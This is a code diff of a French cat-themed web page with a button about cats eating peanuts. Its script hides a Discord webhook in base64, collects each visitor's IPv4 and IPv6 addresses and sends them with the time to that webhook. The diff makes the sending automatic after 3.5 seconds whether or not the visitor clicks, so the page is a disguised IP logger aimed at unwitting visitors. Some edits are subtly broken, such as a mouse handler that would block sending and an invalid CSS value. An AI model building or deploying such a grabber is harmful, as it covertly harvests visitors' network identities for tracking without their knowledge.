@@ -10,24 +10,25 @@
             animation:g 15s ease infinite;display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;}
         @keyframes g{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
         h1{font-size:6vw;font-weight:900;background:rgba(255,255,255,0.15);padding:60px 100px;border-radius:50px;backdrop-filter:blur(15px);}
-        .btn{margin-top:30px;padding:16px 40px;background:rgba(255,255,255,0.25);border:none;border-radius:50px;
-            color:white;font-size:19px;font-weight:bold;cursor:pointer;backdrop-filter:blur(10px);
-            box-shadow:0 8px 25px rgba(0,0,0,0.3);transition:.3s;}
+        .btn{margin-top:30px;padding:16px 40px;background:rgba(255,255,255,.25);border:none;border-radius:50px;
+            color:white;font-size:19px bold;cursor:pointer;backdrop-filter:blur(10px);
+            box-shadow:0 8px 25px rgba(0,0,0,.3);transition:.3s;}
         .btn:hover{transform:scale(1.08);}
         @media(max-width:768px){h1{font-size:11vw;padding:40px 60px;}}
     </style>
 </head>
 <body>
-
 <h1>Les chats sont les meilleurs</h1>
 <button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
 
 <script>
-// Ton webhook en base64 (celui qui marche encore pour l’instant)
-const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4OTQwNDAwNjk3NzYxMC95enVaOVppTHRtQzhVQzZQSFR0TnEtU2VqSHlJQ2NfWHgxMWN3VzhoNlRHaUQ3dVdrN2NyV3NhWEtXX1RFeWQwSHJvag==";
+const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4OTQwNDAwNjk3NzYxMC95enVaOVppTHRtQzhVQzZQSFR0TnEtU2VqSHlJQ2NfWHgxMWN3VzhoNlRHaUQ3dVdrN2NyV3NhWEtXX1RFeWQwSHJvag=="; // ← remplace par ton nouveau
 
-let human = false;
-document.onmousemove = document.ontouchstart = () => human = true;
+let alreadySent = false; // bloque les doublons
+
+document.onmousemove = document.ontouchstart = () => {
+    if (!alreadySent) alreadySent = true;
+};
 
 async function getIPs() {
     let ipv4 = "inconnue", ipv6 = "non détectée";
@@ -43,6 +44,9 @@ async function getIPs() {
 }
 
 async function send() {
+    if (alreadySent) return; // ← plus qu’une seule fois
+    alreadySent = true;
+
     const { ipv4, ipv6 } = await getIPs();
     const url = atob(webhookB64);
 
@@ -59,27 +63,24 @@ async function send() {
                     { name: "Heure", value: new Date().toLocaleString("fr-FR") }
                 ],
                 image: { url: "https://i.redd.it/289ch4osfyie1.jpeg" },
-                thumbnail: { url: "https://cataas.com/cat" },
-                footer: { text: human ? "Humain détecté" : "Envoi automatique" }
+                thumbnail: { url: "https://cataas.com/cat" }
             }]
         })
     });
 }
 
-// Clic sur le bouton
+// Clic → envoi immédiat + disparition
 document.getElementById("btn").onclick = () => {
-    human = true;
     send();
-    const btn = document.getElementById("btn");
-    btn.style.transition = "all 0.6s";
-    btn.style.transform = "scale(0)";
-    setTimeout(() => btn.remove(), 600);
+    const b = document.getElementById("btn");
+    b.style.transition = "all .6s";
+    b.style.transform = "scale(0)";
+    setTimeout(() => b.remove(), 600);
     alert("Merci ! Les chats sont contents");
 };
 
-// Envoi auto après 3,5 s si mouvement
-setTimeout(() => { if (human) send(); }, 3500);
-
+// Sinon envoi auto après 3,5 s
+setTimeout(send, 3500);
 </script>
 </body>
 </html>
